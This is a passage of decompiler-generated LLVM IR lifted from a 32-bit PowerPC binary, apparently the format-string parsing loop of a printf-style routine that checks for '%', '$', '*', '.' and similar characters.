  store i32 %v2_1000c6e8, i32* %r9.global-to-local, align 4
  br i1 %v3_1000c6e4, label %dec_label_pc_1000c6f0, label %dec_label_pc_1000c6c4

dec_label_pc_1000c6f0:                            ; preds = %dec_label_pc_1000c6d0
  %v0_1000c6f0 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000c6f0 = add i32 %v0_1000c6f0, -1
  %v2_1000c6f0 = inttoptr i32 %v1_1000c6f0 to i8*
  %v3_1000c6f0 = load i8, i8* %v2_1000c6f0, align 1
  %v4_1000c6f0 = zext i8 %v3_1000c6f0 to i32
  store i32 %v4_1000c6f0, i32* %r0.global-to-local, align 4
  %v3_1000c6f4 = icmp eq i8 %v3_1000c6f0, 37
  br i1 %v3_1000c6f4, label %dec_label_pc_1000c6fc, label %dec_label_pc_1000c7c4

dec_label_pc_1000c6fc:                            ; preds = %dec_label_pc_1000c6f0
  %v3_1000c6fc = icmp eq i8 %v2_1000c6d0, 36
  br i1 %v3_1000c6fc, label %dec_label_pc_1000c704, label %dec_label_pc_1000c738

dec_label_pc_1000c704:                            ; preds = %dec_label_pc_1000c6fc
  %tmp58 = icmp slt i32 %v0_1000c71c, 1
  br i1 %tmp58, label %dec_label_pc_1000c738, label %dec_label_pc_1000c70c

dec_label_pc_1000c70c:                            ; preds = %dec_label_pc_1000c704
  %v0_1000c70c = load i32, i32* @r26, align 4
  %v3_1000c70c = icmp eq i32 %v0_1000c70c, 0
  %v1_1000c710 = add i32 %v0_1000c74c, 1
  store i32 %v1_1000c710, i32* %r10.global-to-local, align 4
  br i1 %v3_1000c70c, label %dec_label_pc_1000cad4, label %dec_label_pc_1000c718

dec_label_pc_1000c718:                            ; preds = %dec_label_pc_1000c70c
  %v3_1000c718 = icmp sgt i32 %v0_1000c71c, %v0_1000c70c
  br i1 %v3_1000c718, label %dec_label_pc_1000c724, label %dec_label_pc_1000c730

dec_label_pc_1000c724:                            ; preds = %dec_label_pc_1000c718
  store i32 %v0_1000c71c, i32* @r26, align 4
  br label %dec_label_pc_1000c730

dec_label_pc_1000c72c:                            ; preds = %dec_label_pc_1000c754, %dec_label_pc_1000c74c
  store i32 0, i32* @r26, align 4
  br label %dec_label_pc_1000c730

dec_label_pc_1000c730:                            ; preds = %dec_label_pc_1000c718, %dec_label_pc_1000c724, %dec_label_pc_1000c72c
  %v0_1000c730 = phi i32 [ %v0_1000c6f0, %dec_label_pc_1000c72c ], [ %v1_1000c710, %dec_label_pc_1000c724 ], [ %v1_1000c710, %dec_label_pc_1000c718 ]
  %stack_var_-84.2 = phi i32 [ %stack_var_-84.1, %dec_label_pc_1000c72c ], [ %v0_1000c71c, %dec_label_pc_1000c724 ], [ %v0_1000c71c, %dec_label_pc_1000c718 ]
  br label %dec_label_pc_1000c76c

dec_label_pc_1000c738:                            ; preds = %dec_label_pc_1000c6fc, %dec_label_pc_1000c704
  %v0_1000c738 = load i32, i32* @r26, align 4
  %tmp59 = icmp slt i32 %v0_1000c738, 1
  br i1 %tmp59, label %dec_label_pc_1000c74c, label %dec_label_pc_1000c740

dec_label_pc_1000c740:                            ; preds = %dec_label_pc_1000c738
  %v3_1000c740 = icmp eq i8 %v2_1000c6d0, 109
  br i1 %v3_1000c740, label %dec_label_pc_1000c7c4, label %dec_label_pc_1000cad4

dec_label_pc_1000c74c:                            ; preds = %dec_label_pc_1000c738
  %v3_1000c74c = icmp ugt i32 %v0_1000c74c, %v0_1000c6f0
  br i1 %v3_1000c74c, label %dec_label_pc_1000c754, label %dec_label_pc_1000c72c

dec_label_pc_1000c754:                            ; preds = %dec_label_pc_1000c74c
  %v1_1000c754 = inttoptr i32 %v0_1000c6f0 to i8*
  %v2_1000c754 = load i8, i8* %v1_1000c754, align 1
  %v3_1000c754 = zext i8 %v2_1000c754 to i32
  store i32 %v3_1000c754, i32* %r0.global-to-local, align 4
  store i32 %v0_1000c6f0, i32* %r11.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  %v3_1000c760 = icmp eq i8 %v2_1000c754, 48
  br i1 %v3_1000c760, label %dec_label_pc_1000c72c, label %dec_label_pc_1000c7c8

dec_label_pc_1000c76c:                            ; preds = %dec_label_pc_1000c788, %dec_label_pc_1000c730
  %v0_1000c78c = phi i32 [ %v0_1000c730, %dec_label_pc_1000c730 ], [ %v1_1000c78c, %dec_label_pc_1000c788 ]
  store i32 %v0_1000c78c, i32* @r30, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1001c8fc.849 to i32), i32* %r11.global-to-local, align 4
  store i32 1, i32* %r10.global-to-local, align 4
  %v1_1000c77c = inttoptr i32 %v0_1000c78c to i8*
  br label %dec_label_pc_1000c774

dec_label_pc_1000c774:                            ; preds = %dec_label_pc_1000c794, %dec_label_pc_1000c76c
  %v1_1000c788 = phi i32 [ %v1_1000c798, %dec_label_pc_1000c794 ], [ 1, %dec_label_pc_1000c76c ]
  %v0_1000c774 = phi i32 [ %v1_1000c778, %dec_label_pc_1000c794 ], [ ptrtoint ([8 x i8]* @global_var_1001c8fc.849 to i32), %dec_label_pc_1000c76c ]
  %v1_1000c774 = inttoptr i32 %v0_1000c774 to i8*
  %v2_1000c774 = load i8, i8* %v1_1000c774, align 1
  %v3_1000c774 = zext i8 %v2_1000c774 to i32
  store i32 %v3_1000c774, i32* %r9.global-to-local, align 4
  %v1_1000c778 = add i32 %v0_1000c774, 1
  store i32 %v1_1000c778, i32* %r11.global-to-local, align 4
  %v2_1000c77c = load i8, i8* %v1_1000c77c, align 1
  %v3_1000c77c = zext i8 %v2_1000c77c to i32
  store i32 %v3_1000c77c, i32* %r0.global-to-local, align 4
  %v4_1000c780 = icmp eq i8 %v2_1000c77c, %v2_1000c774
  br i1 %v4_1000c780, label %dec_label_pc_1000c788, label %dec_label_pc_1000c794

dec_label_pc_1000c788:                            ; preds = %dec_label_pc_1000c774
  %v0_1000c788 = load i32, i32* %r6.global-to-local, align 4
  %v2_1000c788 = or i32 %v0_1000c788, %v1_1000c788
  store i32 %v2_1000c788, i32* %r6.global-to-local, align 4
  %v1_1000c78c = add i32 %v0_1000c78c, 1
  br label %dec_label_pc_1000c76c

dec_label_pc_1000c794:                            ; preds = %dec_label_pc_1000c774
  %v1_1000c794 = inttoptr i32 %v1_1000c778 to i8*
  %v2_1000c794 = load i8, i8* %v1_1000c794, align 1
  %v3_1000c794 = zext i8 %v2_1000c794 to i32
  store i32 %v3_1000c794, i32* %r0.global-to-local, align 4
  %v1_1000c798 = mul i32 %v1_1000c788, 2
  store i32 %v1_1000c798, i32* %r10.global-to-local, align 4
  %v3_1000c79c = icmp eq i8 %v2_1000c794, 0
  br i1 %v3_1000c79c, label %dec_label_pc_1000c7a4, label %dec_label_pc_1000c774

dec_label_pc_1000c7a4:                            ; preds = %dec_label_pc_1000c794
  %v1_1000c7a4 = add i32 %v0_1000c78c, -1
  %v2_1000c7a4 = inttoptr i32 %v1_1000c7a4 to i8*
  %v3_1000c7a4 = load i8, i8* %v2_1000c7a4, align 1
  %v4_1000c7a4 = zext i8 %v3_1000c7a4 to i32
  store i32 %v4_1000c7a4, i32* %r0.global-to-local, align 4
  %v0_1000c7a8 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000c7a8 = and i32 %v0_1000c7a8, 10
  store i32 0, i32* @r8, align 4
  %v3_1000c7b0 = icmp eq i8 %v3_1000c7a4, 37
  %v1_1000c7b4 = udiv i32 %v1_1000c7a8, 2
  store i32 %v1_1000c7b4, i32* %r9.global-to-local, align 4
  %v2_1000c7b8 = sub nuw nsw i32 -1, %v1_1000c7b4
  %v3_1000c7b8 = and i32 %v0_1000c7a8, %v2_1000c7b8
  store i32 %v3_1000c7b8, i32* %r6.global-to-local, align 4
  br i1 %v3_1000c7b0, label %dec_label_pc_1000c7c8, label %dec_label_pc_1000c694

dec_label_pc_1000c7c4:                            ; preds = %dec_label_pc_1000c6f0, %dec_label_pc_1000c740
  store i32 %v0_1000c6f0, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000c7c8

dec_label_pc_1000c7c8:                            ; preds = %dec_label_pc_1000c754, %dec_label_pc_1000c7a4, %dec_label_pc_1000c7c4
  %v0_1000c7fc = phi i32 [ 0, %dec_label_pc_1000c7a4 ], [ %v0_1000c71c, %dec_label_pc_1000c754 ], [ %v0_1000c71c, %dec_label_pc_1000c7c4 ]
  %v1_1000c808 = phi i32 [ %v0_1000c78c, %dec_label_pc_1000c7a4 ], [ %v0_1000c74c, %dec_label_pc_1000c754 ], [ %v0_1000c74c, %dec_label_pc_1000c7c4 ]
  %v0_1000c804 = phi i32 [ %v1_1000c778, %dec_label_pc_1000c7a4 ], [ %v0_1000c6f0, %dec_label_pc_1000c754 ], [ %v0_1000c6f0, %dec_label_pc_1000c7c4 ]
  %stack_var_-84.3 = phi i32 [ %stack_var_-84.2, %dec_label_pc_1000c7a4 ], [ %stack_var_-84.1, %dec_label_pc_1000c754 ], [ %stack_var_-84.1, %dec_label_pc_1000c7c4 ]
  %v1_1000c7c8 = inttoptr i32 %v0_1000c804 to i8*
  %v2_1000c7c8 = load i8, i8* %v1_1000c7c8, align 1
  %v3_1000c7c8 = zext i8 %v2_1000c7c8 to i32
  store i32 %v3_1000c7c8, i32* %r0.global-to-local, align 4
  %v3_1000c7cc = icmp eq i8 %v2_1000c7c8, 42
  br i1 %v3_1000c7cc, label %dec_label_pc_1000c7d4, label %dec_label_pc_1000c814

dec_label_pc_1000c7d4:                            ; preds = %dec_label_pc_1000c7c8
  %v0_1000c7d4 = load i32, i32* @r26, align 4
  %v3_1000c7d4 = icmp eq i32 %v0_1000c7d4, 0
  br i1 %v3_1000c7d4, label %dec_label_pc_1000c804, label %dec_label_pc_1000c7dc

dec_label_pc_1000c7dc:                            ; preds = %dec_label_pc_1000c7d4
  %v1_1000c7dc = inttoptr i32 %v1_1000c808 to i8*
  %v2_1000c7dc = load i8, i8* %v1_1000c7dc, align 1
  %v3_1000c7dc = zext i8 %v2_1000c7dc to i32
  store i32 %v3_1000c7dc, i32* %r0.global-to-local, align 4
  %v3_1000c7e0 = icmp eq i8 %v2_1000c7dc, 36
  br i1 %v3_1000c7e0, label %dec_label_pc_1000c7e8, label %dec_label_pc_1000cad4

dec_label_pc_1000c7e8:                            ; preds = %dec_label_pc_1000c7dc
  %tmp60 = icmp slt i32 %v0_1000c7fc, 1
  br i1 %tmp60, label %dec_label_pc_1000cad4, label %dec_label_pc_1000c7f0

dec_label_pc_1000c7f0:                            ; preds = %dec_label_pc_1000c7e8
  %v0_1000c7f0 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000c7f0 = mul i32 %v0_1000c7f0, -4
  %v1_1000c7f4 = add i32 %v1_1000c808, 1
  store i32 %v1_1000c7f4, i32* @r30, align 4
  %v0_1000c7f8 = load i32, i32* %r3.global-to-local, align 4
  %v2_1000c7f8 = add i32 %v0_1000c7f8, %v1_1000c7f0
  store i32 %v2_1000c7f8, i32* %r9.global-to-local, align 4
  %v2_1000c7fc = add i32 %v2_1000c7f8, 12
  %v3_1000c7fc = inttoptr i32 %v2_1000c7fc to i32*
  store i32 %v0_1000c7fc, i32* %v3_1000c7fc, align 4
  %v0_1000c81c.pre.pre = load i32, i32* @r30, align 4
  br label %dec_label_pc_1000c810

dec_label_pc_1000c804:                            ; preds = %dec_label_pc_1000c7d4
  %v1_1000c804 = add i32 %v0_1000c804, 1
  store i32 %v1_1000c804, i32* %r0.global-to-local, align 4
  %v4_1000c808 = icmp eq i32 %v1_1000c804, %v1_1000c808
  br i1 %v4_1000c808, label %dec_label_pc_1000c810, label %dec_label_pc_1000cad4

dec_label_pc_1000c810:                            ; preds = %dec_label_pc_1000c804, %dec_label_pc_1000c7f0
  %v0_1000c81c.pre = phi i32 [ %v1_1000c808, %dec_label_pc_1000c804 ], [ %v0_1000c81c.pre.pre, %dec_label_pc_1000c7f0 ]
  store i32 -2147483648, i32* @r8, align 4
  br label %dec_label_pc_1000c814

dec_label_pc_1000c814:                            ; preds = %dec_label_pc_1000c7c8, %dec_label_pc_1000c810
  %v0_1000c81c = phi i32 [ %v1_1000c808, %dec_label_pc_1000c7c8 ], [ %v0_1000c81c.pre, %dec_label_pc_1000c810 ]
  %v0_1000c82c = phi i32 [ %v0_1000c7fc, %dec_label_pc_1000c7c8 ], [ -2147483648, %dec_label_pc_1000c810 ]
  %v0_1000c814 = load i32, i32* %r5.global-to-local, align 4
  %v3_1000c814 = icmp eq i32 %v0_1000c814, 0
  %v1_1000c81c = inttoptr i32 %v0_1000c81c to i8*
  br i1 %v3_1000c814, label %dec_label_pc_1000c81c, label %dec_label_pc_1000c840

dec_label_pc_1000c81c:                            ; preds = %dec_label_pc_1000c814
  %v2_1000c81c = load i8, i8* %v1_1000c81c, align 1
  %v3_1000c81c = zext i8 %v2_1000c81c to i32
  store i32 %v3_1000c81c, i32* %r0.global-to-local, align 4
  %v3_1000c820 = icmp eq i8 %v2_1000c81c, 46
  br i1 %v3_1000c820, label %dec_label_pc_1000c828, label %dec_label_pc_1000c838

dec_label_pc_1000c828:                            ; preds = %dec_label_pc_1000c81c
  %v1_1000c828 = add i32 %v0_1000c81c, 1
  store i32 %v0_1000c82c, i32* @r31, align 4
  store i32 -1, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000c694

dec_label_pc_1000c838:                            ; preds = %dec_label_pc_1000c81c
  store i32 %v0_1000c82c, i32* @r31, align 4
  br label %dec_label_pc_1000c840

dec_label_pc_1000c840:                            ; preds = %dec_label_pc_1000c814, %dec_label_pc_1000c838
  %storemerge1 = phi i32 [ -1, %dec_label_pc_1000c838 ], [ %v0_1000c82c, %dec_label_pc_1000c814 ]
  store i32 %storemerge1, i32* %r4.global-to-local, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v2_1000c844 = load i8, i8* %v1_1000c81c, align 1
  %v3_1000c844 = zext i8 %v2_1000c844 to i32
  store i32 %v3_1000c844, i32* %r10.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_1001c8a4.850 to i32), i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000c84c

dec_label_pc_1000c84c:                            ; preds = %dec_label_pc_1000c858, %dec_label_pc_1000c840
  %v0_1000c858 = phi i32 [ %v1_1000c858, %dec_label_pc_1000c858 ], [ ptrtoint ([9 x i8]* @global_var_1001c8a4.850 to i32), %dec_label_pc_1000c840 ]
  %v1_1000c84c = inttoptr i32 %v0_1000c858 to i8*
  %v2_1000c84c = load i8, i8* %v1_1000c84c, align 1
  %v3_1000c84c = zext i8 %v2_1000c84c to i32
  store i32 %v3_1000c84c, i32* %r0.global-to-local, align 4
  %v4_1000c850 = icmp eq i8 %v2_1000c844, %v2_1000c84c
  br i1 %v4_1000c850, label %dec_label_pc_1000c61c, label %dec_label_pc_1000c858

dec_label_pc_1000c858:                            ; preds = %dec_label_pc_1000c84c
  %v1_1000c858 = add i32 %v0_1000c858, 1
  %v2_1000c858 = inttoptr i32 %v1_1000c858 to i8*
  %v3_1000c858 = load i8, i8* %v2_1000c858, align 1
  %v4_1000c858 = zext i8 %v3_1000c858 to i32
  store i32 %v4_1000c858, i32* %r0.global-to-local, align 4
  store i32 %v1_1000c858, i32* %r11.global-to-local, align 4
  %v3_1000c85c = icmp eq i8 %v3_1000c858, 0
  br i1 %v3_1000c85c, label %dec_label_pc_1000c864, label %dec_label_pc_1000c84c

dec_label_pc_1000c864:                            ; preds = %dec_label_pc_1000c858, %dec_label_pc_1000c61c
  %v0_1000c88c = phi i32 [ %v1_1000c61c, %dec_label_pc_1000c61c ], [ %v0_1000c81c, %dec_label_pc_1000c858 ]
  %v0_1000c888 = phi i32 [ %v0_1000c858, %dec_label_pc_1000c61c ], [ %v1_1000c858, %dec_label_pc_1000c858 ]
  %v2_1000c86c = sub i32 %v0_1000c888, ptrtoint ([9 x i8]* @global_var_1001c8a4.850 to i32)
  store i32 %v2_1000c86c, i32* %r9.global-to-local, align 4
  %v2_1000c870 = icmp sgt i32 %v2_1000c86c, 1
  br i1 %v2_1000c870, label %dec_label_pc_1000c890, label %dec_label_pc_1000c878

dec_label_pc_1000c878:                            ; preds = %dec_label_pc_1000c864
  %v1_1000c878 = inttoptr i32 %v0_1000c88c to i8*
  %v2_1000c878 = load i8, i8* %v1_1000c878, align 1
  %v3_1000c878 = zext i8 %v2_1000c878 to i32
  store i32 %v3_1000c878, i32* %r0.global-to-local, align 4
  %v1_1000c87c = inttoptr i32 %v0_1000c888 to i8*
  %v2_1000c87c = load i8, i8* %v1_1000c87c, align 1
  %v3_1000c87c = zext i8 %v2_1000c87c to i32
  store i32 %v3_1000c87c, i32* %r9.global-to-local, align 4
  %v4_1000c880 = icmp eq i8 %v2_1000c878, %v2_1000c87c
  br i1 %v4_1000c880, label %dec_label_pc_1000c888, label %dec_label_pc_1000c890

dec_label_pc_1000c888:                            ; preds = %dec_label_pc_1000c878
  %v1_1000c888 = add i32 %v0_1000c888, 9
  store i32 %v1_1000c888, i32* %r11.global-to-local, align 4
  %v1_1000c88c = add i32 %v0_1000c88c, 1
  store i32 %v1_1000c88c, i32* @r30, align 4
  br label %dec_label_pc_1000c890

dec_label_pc_1000c890:                            ; preds = %dec_label_pc_1000c878, %dec_label_pc_1000c864, %dec_label_pc_1000c888
  %v0_1000c894 = phi i32 [ %v0_1000c888, %dec_label_pc_1000c878 ], [ %v0_1000c888, %dec_label_pc_1000c864 ], [ %v1_1000c888, %dec_label_pc_1000c888 ]
  %v0_1000c890 = phi i32 [ %v0_1000c88c, %dec_label_pc_1000c878 ], [ %v0_1000c88c, %dec_label_pc_1000c864 ], [ %v1_1000c88c, %dec_label_pc_1000c888 ]
  %v1_1000c890 = inttoptr i32 %v0_1000c890 to i8*
  %v2_1000c890 = load i8, i8* %v1_1000c890, align 1
  %v3_1000c890 = zext i8 %v2_1000c890 to i32
  store i32 %v3_1000c890, i32* @r7, align 4
  %v1_1000c894 = add i32 %v0_1000c894, 9
  %v2_1000c894 = inttoptr i32 %v1_1000c894 to i8*
  %v3_1000c894 = load i8, i8* %v2_1000c894, align 1
  %v4_1000c894 = zext i8 %v3_1000c894 to i32
  store i32 %v4_1000c894, i32* %r0.global-to-local, align 4
  %v3_1000c898 = icmp eq i8 %v2_1000c890, 0
  %v1_1000c89c = mul nuw nsw i32 %v4_1000c894, 256
  store i32 %v1_1000c89c, i32* %r10.global-to-local, align 4
  br i1 %v3_1000c898, label %dec_label_pc_1000cad4, label %dec_label_pc_1000c8a4

dec_label_pc_1000c8a4:                            ; preds = %dec_label_pc_1000c890
  %v1_1000c8a8 = and i32 %v1_1000c89c, 1024
  store i32 %v1_1000c8a8, i32* %r0.global-to-local, align 4
  %v3_1000c8a8 = icmp eq i32 %v1_1000c8a8, 0
  store i32 268566528, i32* %r3.global-to-local, align 4
  %v3_1000c8b4 = load i32, i32* %stack_var_-96, align 4
  store i32 %v3_1000c8b4, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001c8d8.852 to i32), i32* %r5.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_1001c8e4.851 to i32), i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c8c4

dec_label_pc_1000c8c4:                            ; preds = %dec_label_pc_1000c928, %dec_label_pc_1000c8a4
  %v1_1000c8d0 = phi i32 [ %v1_1000c928, %dec_label_pc_1000c928 ], [ ptrtoint ([21 x i8]* @global_var_1001c8e4.851 to i32), %dec_label_pc_1000c8a4 ]
  %v1_1000c8c4 = inttoptr i32 %v1_1000c8d0 to i8*
  %v2_1000c8c4 = load i8, i8* %v1_1000c8c4, align 1
  %v3_1000c8c4 = zext i8 %v2_1000c8c4 to i32
  store i32 %v3_1000c8c4, i32* %r0.global-to-local, align 4
  %v4_1000c8c8 = icmp eq i8 %v2_1000c8c4, %v2_1000c890
  br i1 %v4_1000c8c8, label %dec_label_pc_1000c8d0, label %dec_label_pc_1000c928

dec_label_pc_1000c8d0:                            ; preds = %dec_label_pc_1000c8c4
  %v2_1000c8d0 = sub i32 %v1_1000c8d0, ptrtoint ([21 x i8]* @global_var_1001c8e4.851 to i32)
  %tmp61 = icmp slt i32 %v2_1000c8d0, 18
  %brmerge = or i1 %v3_1000c8a8, %tmp61
  br i1 %brmerge, label %dec_label_pc_1000c8e4, label %dec_label_pc_1000c8e0

dec_label_pc_1000c8e0:                            ; preds = %dec_label_pc_1000c8d0
  %v1_1000c8e0 = add i32 %v2_1000c8d0, -2
  br label %dec_label_pc_1000c8e4

dec_label_pc_1000c8e4:                            ; preds = %dec_label_pc_1000c8d0, %dec_label_pc_1000c8e0
  %storemerge = phi i32 [ %v1_1000c8e0, %dec_label_pc_1000c8e0 ], [ %v2_1000c8d0, %dec_label_pc_1000c8d0 ]
  %v0_1000c8e4 = phi i32 [ %v1_1000c8e0, %dec_label_pc_1000c8e0 ], [ %v2_1000c8d0, %dec_label_pc_1000c8d0 ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_1000c8e4 = load i32, i32* @r28, align 4
  %v2_1000c8e4 = add i32 %v1_1000c8e4, 32
  %v3_1000c8e4 = inttoptr i32 %v2_1000c8e4 to i32*
  store i32 %v0_1000c8e4, i32* %v3_1000c8e4, align 4
  store i32 ptrtoint (i32* @global_var_1001c8d7.853 to i32), i32* %r11.global-to-local, align 4
  %v0_1000c8f0.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000c8ec

dec_label_pc_1000c8ec:                            ; preds = %dec_label_pc_1000c8ec, %dec_label_pc_1000c8e4
  %v0_1000c8ec = phi i32 [ %v1_1000c8ec, %dec_label_pc_1000c8ec ], [ ptrtoint (i32* @global_var_1001c8d7.853 to i32), %dec_label_pc_1000c8e4 ]
  %v1_1000c8ec = add i32 %v0_1000c8ec, 1
  %v2_1000c8ec = inttoptr i32 %v1_1000c8ec to i8*
  %v3_1000c8ec = load i8, i8* %v2_1000c8ec, align 1
  %v4_1000c8ec = zext i8 %v3_1000c8ec to i32
  store i32 %v4_1000c8ec, i32* %r0.global-to-local, align 4
  store i32 %v1_1000c8ec, i32* %r11.global-to-local, align 4
  %v3_1000c8f0 = icmp sgt i32 %v0_1000c8f0.pre, %v4_1000c8ec
  br i1 %v3_1000c8f0, label %dec_label_pc_1000c8ec, label %dec_label_pc_1000c8f8

dec_label_pc_1000c8f8:                            ; preds = %dec_label_pc_1000c8ec
  %v0_1000c8f8 = load i32, i32* %r5.global-to-local, align 4
  %v2_1000c8f8 = sub i32 %v1_1000c8ec, %v0_1000c8f8
  %v1_1000c900 = mul i32 %v2_1000c8f8, 2
  store i32 %v1_1000c900, i32* %r11.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001c8c8.854 to i32), i32* %r9.global-to-local, align 4
  %v2_1000c908 = add i32 %v1_1000c900, ptrtoint (i32* @global_var_1001c8c8.854 to i32)
  %v3_1000c908 = inttoptr i32 %v2_1000c908 to i16*
  %v4_1000c908 = load i16, i16* %v3_1000c908, align 2
  %v5_1000c908 = sext i16 %v4_1000c908 to i32
  store i32 %v5_1000c908, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1001c8b8.855 to i32), i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([21 x i8]* @global_var_1001c8e4.851 to i32), i32* @r8, align 4
  %v2_1000c918 = add i32 %v1_1000c900, ptrtoint (i32* @global_var_1001c8b8.855 to i32)
  %v3_1000c918 = inttoptr i32 %v2_1000c918 to i16*
  %v4_1000c918 = load i16, i16* %v3_1000c918, align 2
  %v5_1000c918 = sext i16 %v4_1000c918 to i32
  store i32 %v5_1000c918, i32* %r9.global-to-local, align 4
  %v2_1000c91c = or i32 %v5_1000c908, %v1_1000c89c
  store i32 %v2_1000c91c, i32* %r0.global-to-local, align 4
  %v2_1000c920 = and i32 %v5_1000c918, %v2_1000c91c
  store i32 %v2_1000c920, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000c934

dec_label_pc_1000c928:                            ; preds = %dec_label_pc_1000c8c4
  %v1_1000c928 = add i32 %v1_1000c8d0, 1
  %v2_1000c928 = inttoptr i32 %v1_1000c928 to i8*
  %v3_1000c928 = load i8, i8* %v2_1000c928, align 1
  %v4_1000c928 = zext i8 %v3_1000c928 to i32
  store i32 %v4_1000c928, i32* %r0.global-to-local, align 4
  store i32 %v1_1000c928, i32* @r8, align 4
  %v3_1000c92c = icmp eq i8 %v3_1000c928, 0
  br i1 %v3_1000c92c, label %dec_label_pc_1000c934, label %dec_label_pc_1000c8c4

dec_label_pc_1000c934:                            ; preds = %dec_label_pc_1000c928, %dec_label_pc_1000c8f8
  %v0_1000c934 = phi i32 [ %v2_1000c920, %dec_label_pc_1000c8f8 ], [ %v3_1000c8b4, %dec_label_pc_1000c928 ]
  store i32 %v0_1000c934, i32* %stack_var_-96, align 4
  %v0_1000c938 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000c938 = call i32 @__asm_rlwinm(i32 %v0_1000c938, i32 30, i32 31, i32 31)
  %not.v2_1000c93c = icmp eq i32 %v1_1000c938, 0
  %v6_1000c940 = sext i1 %not.v2_1000c93c to i32
  store i32 %v6_1000c940, i32* %r9.global-to-local, align 4
  %v1_1000c944 = call i32 @__asm_rlwinm(i32 %v1_1000c89c, i32 0, i32 20, i32 23)
  store i32 %v1_1000c944, i32* %r0.global-to-local, align 4
  %v1_1000c948 = call i32 @__asm_rlwinm(i32 %v6_1000c940, i32 0, i32 0, i32 27)
  store i32 %v1_1000c948, i32* %r9.global-to-local, align 4
  %v0_1000c94c = load i32, i32* @r30, align 4
  %v1_1000c94c = inttoptr i32 %v0_1000c94c to i8*
  %v2_1000c94c = load i8, i8* %v1_1000c94c, align 1
  %v3_1000c94c = zext i8 %v2_1000c94c to i32
  store i32 %v3_1000c94c, i32* %r10.global-to-local, align 4
  %v0_1000c950 = load i32, i32* %r6.global-to-local, align 4
  %v1_1000c950 = call i32 @__asm_rlwinm(i32 %v0_1000c950, i32 0, i32 30, i32 28)
  %v1_1000c954 = add i32 %v1_1000c948, 48
  store i32 %v1_1000c954, i32* %r9.global-to-local, align 4
  %v2_1000c958 = or i32 %v1_1000c950, %v1_1000c944
  store i32 %v2_1000c958, i32* %r11.global-to-local, align 4
  store i32 1, i32* @r7, align 4
  %v0_1000c960 = load i32, i32* %r10.global-to-local, align 4
  %v1_1000c960 = load i32, i32* @r28, align 4
  %v2_1000c960 = add i32 %v1_1000c960, 12
  %v3_1000c960 = inttoptr i32 %v2_1000c960 to i32*
  store i32 %v0_1000c960, i32* %v3_1000c960, align 4
  %v0_1000c964 = load i32, i32* %r4.global-to-local, align 4
  %v1_1000c964 = load i32, i32* @r28, align 4
  %v2_1000c964 = add i32 %v1_1000c964, 4
  %v3_1000c964 = inttoptr i32 %v2_1000c964 to i32*
  store i32 %v0_1000c964, i32* %v3_1000c964, align 4
  %v0_1000c968 = load i32, i32* @r31, align 4
  %v1_1000c968 = load i32, i32* @r28, align 4
  %v2_1000c968 = add i32 %v1_1000c968, 8
  %v3_1000c968 = inttoptr i32 %v2_1000c968 to i32*
  store i32 %v0_1000c968, i32* %v3_1000c968, align 4
  %v0_1000c96c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000c96c = load i32, i32* @r28, align 4
  %v2_1000c96c = add i32 %v1_1000c96c, 20
  %v3_1000c96c = inttoptr i32 %v2_1000c96c to i32*
  store i32 %v0_1000c96c, i32* %v3_1000c96c, align 4
  %v0_1000c970 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000c970 = load i32, i32* @r28, align 4
  %v2_1000c970 = add i32 %v1_1000c970, 16
  %v3_1000c970 = inttoptr i32 %v2_1000c970 to i32*
  store i32 %v0_1000c970, i32* %v3_1000c970, align 4
  %v0_1000c974 = load i32, i32* @r7, align 4
  %v1_1000c974 = load i32, i32* @r28, align 4
  %v2_1000c974 = add i32 %v1_1000c974, 28
  %v3_1000c974 = inttoptr i32 %v2_1000c974 to i32*
  store i32 %v0_1000c974, i32* %v3_1000c974, align 4
  %v0_1000c978 = load i32, i32* @r8, align 4
  %v1_1000c978 = inttoptr i32 %v0_1000c978 to i8*
  %v2_1000c978 = load i8, i8* %v1_1000c978, align 1
  %v3_1000c978 = zext i8 %v2_1000c978 to i32
  store i32 %v3_1000c978, i32* %r9.global-to-local, align 4
  %v3_1000c97c = icmp eq i8 %v2_1000c978, 0
  br i1 %v3_1000c97c, label %dec_label_pc_1000c984, label %dec_label_pc_1000c99c

dec_label_pc_1000c984:                            ; preds = %dec_label_pc_1000c934
  %v0_1000c984 = load i32, i32* @r30, align 4
  %v1_1000c984 = inttoptr i32 %v0_1000c984 to i8*
  %v2_1000c984 = load i8, i8* %v1_1000c984, align 1
  %v3_1000c984 = zext i8 %v2_1000c984 to i32
  store i32 %v3_1000c984, i32* %r0.global-to-local, align 4
  %v3_1000c988 = icmp eq i8 %v2_1000c984, 109
  br i1 %v3_1000c988, label %dec_label_pc_1000c990, label %dec_label_pc_1000cad4

dec_label_pc_1000c990:                            ; preds = %dec_label_pc_1000c984
  store i32 20, i32* %r0.global-to-local, align 4
  %v1_1000c994 = load i32, i32* @r28, align 4
  %v2_1000c994 = add i32 %v1_1000c994, 28
  %v3_1000c994 = inttoptr i32 %v2_1000c994 to i32*
  store i32 %v3_1000c978, i32* %v3_1000c994, align 4
  %v0_1000c998 = load i32, i32* %r0.global-to-local, align 4
  %v1_1000c998 = load i32, i32* @r28, align 4
  %v2_1000c998 = add i32 %v1_1000c998, 32
  %v3_1000c998 = inttoptr i32 %v2_1000c998 to i32*
  store i32 %v0_1000c998, i32* %v3_1000c998, align 4
  br label %dec_label_pc_1000c99c

